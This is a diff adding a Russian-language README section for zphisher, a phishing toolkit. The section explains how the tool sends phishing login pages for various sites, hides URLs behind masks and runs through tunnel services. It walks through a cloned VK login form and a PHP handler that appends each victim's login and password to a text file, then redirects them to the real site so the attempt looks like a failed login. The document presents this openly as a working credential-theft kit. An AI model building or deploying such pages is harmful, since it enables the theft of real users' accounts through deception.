@@ -187,3 +187,128 @@ $ zphisher
 <table>
 
 <!-- // -->
+
+## Описание программы
+
+Данная программа позволяет использовать рассылки фишинговых страниц логина в различные сайты, соцсети и другие приложения
+
+Фишки программы:
+- Используются последние версии страничек входа приложений
+- различные способы развертывания приложения:
+  - на локальной машине
+  - cloudflare
+  - localXpose
+- мы можем ставить кастомную маску `URL`
+- есть поддержка `Docker`
+
+## Структура программы
+
+Структура программы выглядит следущим образом:
+- `sites`: сайты
+  - В данной папке находятся различные шаблоны сайтов для входа на сайт, в соцсеть
+- `scripts`: папка скриптов, в ней находится один скрипт, нужный для запуска
+- `Dockerfile`: обычный докерфайл
+- `run-docker.sh`: скрипт для запуска докера
+- `zphisher.sh`: самый главный скрипт, необходимый для запуска
+
+## Разбор кода шаблона страницы
+
+Возьмем, например, ВК. В каждой папке структура выглядит примерно следующим образом:
+- `assets-файлы`: различные картинки и иконки
+- `index.php`: он импортирует в себя файл `ip.php`. Нужен для определения ip-адреса жертвы
+- `login.html`: главный файл разметки, содержит в себе обычную разметку и инлайновые стили
+- `login.php`: по сути главный файл, через который мы ловим данные жертвы
+
+Разберем работу детальнее
+
+В HTML-файле нас интересует следующий кусок кода:
+
+```html
+                                        <form class="vkc__DefaultSkin__contentMobile vkc__DefaultSkin__content"
+                                            method="post" action="login.php">
+                                            <div>
+                                                <div class=vkc__StepInfo__body>
+                                                    <div class="vkc__StepInfo__avatar vkc__StepInfo__hideAvatarMedia">
+                                                        <div class=vkc__DefaultSkin__avatar>
+                                                            <div class=vkc__ServiceAvatar__serviceAvatar>
+                                                                <div class=vkc__ServiceAvatar__img><svg width=48
+                                                                        height=48 fill=none
+                                                                        xmlns=http://www.w3.org/2000/svg
+                                                                        viewBox="0 0 20 20" style=display:block>
+                                                                        <path
+                                                                            d="M0 9.6c0-4.5 0-6.8 1.4-8.2C2.8 0 5.1 0 9.6 0h.8c4.5 0 6.8 0 8.2 1.4C20 2.8 20 5.1 20 9.6v.8c0 4.5 0 6.8-1.4 8.2-1.4 1.4-3.7 1.4-8.2 1.4h-.8c-4.5 0-6.8 0-8.2-1.4C0 17.2 0 14.9 0 10.4v-.8Z"
+                                                                            fill=#07F></path>
+                                                                        <path
+                                                                            d="M10.7 14.3c-4.5 0-7.2-3.1-7.3-8.3h2.3c0 3.8 1.8 5.4 3.1 5.8V6H11v3.3c1.3-.1 2.6-1.6 3-3.3h2.2c-.3 2-1.8 3.5-2.8 4.2 1 .5 2.7 1.8 3.3 4.1h-2.3c-.5-1.6-1.8-2.8-3.4-3v3h-.3Z"
+                                                                            fill=#fff></path>
+                                                                    </svg></div>
+                                                            </div>
+                                                        </div>
+                                                    </div>
+                                                    <h1
+                                                        class="vkc__VKDisplayTitle__title vkc__VKDisplayTitle__demiboldWeight vkc__VKDisplayTitle__titleLevel2">
+                                                        <div>Enter phone number</div>
+                                                    </h1>
+                                                    <h3
+                                                        class="vkc__StepInfo__description vkuiHeadline vkuiHeadline--android vkuiHeadline--sizeY-compact vkuiHeadline--l-1 vkuiHeadline--w-regular">
+                                                        You'll use your phone number to&nbsp;sign&nbsp;in
+                                                        to&nbsp;your&nbsp;account</h3>
+                                                </div>
+                                                <section class=vkc__DefaultSkin__form>
+                                                    <div class=vkc__DefaultSkin__input>
+                                                        <div>
+                                                            <div class=vkc__TextField__wrapper><input name=login
+                                                                    type=text class=vkc__TextField__input
+                                                                    placeholder="Email or&nbsp;phone"
+                                                                    autocomplete=username required value></div>
+                                                        </div>
+                                                        </br>
+                                                        <div>
+                                                            <div class=vkc__TextField__wrapper><input name=password
+                                                                type=password class=vkc__TextField__input
+                                                                placeholder="Enter password"
+                                                                autocomplete=current-password required value></div>
+                                                        </div>
+                                                    </div>
+                                                </section>
+                                            </div>
+                                            <div class=vkc__DefaultSkin__buttonContainer>
+                                                <div class=vkc__DefaultSkin__button><button type=submit
+                                                        class="vkuiButton vkuiButton--sz-l vkuiButton--lvl-primary vkuiButton--clr-accent vkuiButton--aln-center vkuiButton--sizeY-compact vkuiButton--stretched vkuiTappable vkuiTappable--sizeX-regular vkuiTappable--hasHover vkuiTappable--mouse"><span
+                                                            class=vkuiButton__in><span
+                                                                class="vkuiButton__content vkuiText vkuiText--sizeY-compact vkuiText--w-2">Continue</span></span><span
+                                                            aria-hidden=true
+                                                            class=vkuiTappable__hoverShadow></span></button></div>
+                                                <div>
+                                                    <div class="vkc__Agreement__wrapper vkc__Agreement__centered">
+                                                        <div>By pressing <b>Continue</b>, you agree to the <a
+                                                                href=https://id.vk.com/terms class=vkc__Agreement__link
+                                                                target=_blank>Terms of Service</a> and <a
+                                                                href=https://id.vk.com/privacy
+                                                                class=vkc__Agreement__link target=_blank>Privacy
+                                                                Policy</a></div>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </form>
+
+```
+Тег `form` отвечает за отправку данных. Есть два поля `login` и `password`. Далее они идут POST-запросом в файл `login.php`:
+
+```php
+<?php
+
+file_put_contents("usernames.txt", "Vk Username: " . $_POST['login'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND); // добавляем в файл usernames данные пользователя
+header('Location: https://vk.com/restore/'); // перенапрпавляем пользователя на оригинальный сайт, показывая ему, что якобы произошла ошибка при входе
+exit();
+
+```
+
+Это и есть по сути вся работа программы
+
+
+## Запуск программы
+
+### Главная страница программы
+
+[MainPage]('./images/image1.png')
